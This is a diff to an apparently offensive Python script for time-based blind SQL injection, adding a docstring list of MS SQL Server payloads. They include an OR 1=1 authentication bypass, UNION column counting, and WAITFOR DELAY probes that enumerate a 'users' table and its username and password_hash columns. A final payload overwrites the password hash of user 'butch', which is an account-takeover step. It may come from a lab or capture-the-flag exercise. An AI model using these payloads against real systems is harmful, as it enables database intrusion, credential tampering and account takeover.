@@ -35,5 +35,13 @@ for pos in range(1, 20):
     print(f"[+] Found character at position {pos}: {chr(low)} -> Current string: {extracted_string}")
 
 """
-Template to do time based blind sqli. 
+Check first: ' OR 1=1 #' 
+Count cols:  ' UNION ALL select 1, 2 -- , or just try ' UNION select * from table_name -- ' 
+'; IF (1=2) WAITFOR DELAY '0:0:10';-- 
+'; IF ((select count(name) from sys.tables where name = 'users')=1) WAITFOR DELAY '0:0:10';--
+'; IF ((select count(c.name) from sys.columns c, sys.tables t where c.object_id = t.object_id and t.name = 'users' and c.name = 'username')=1) WAITFOR DELAY '0:0:10';--
+'; IF ((select count(c.name) from sys.columns c, sys.tables t where c.object_id = t.object_id and t.name = 'users' and c.name like 'pass%')=1) WAITFOR DELAY '0:0:10';--
+'; IF ((select count(c.name) from sys.columns c, sys.tables t where c.object_id = t.object_id and t.name = 'users' and c.name = 'password_hash')=1) WAITFOR DELAY '0:0:10';--
+'; IF ((select count(username) from users where username = 'butch')=1) WAITFOR DELAY '0:0:10';--
+'; update users set password_hash = '6183c9c42758fa0e16509b384e2c92c8a21263afa49e057609e3a7fb0e8e5ebb' where username = 'butch';-- 
 """
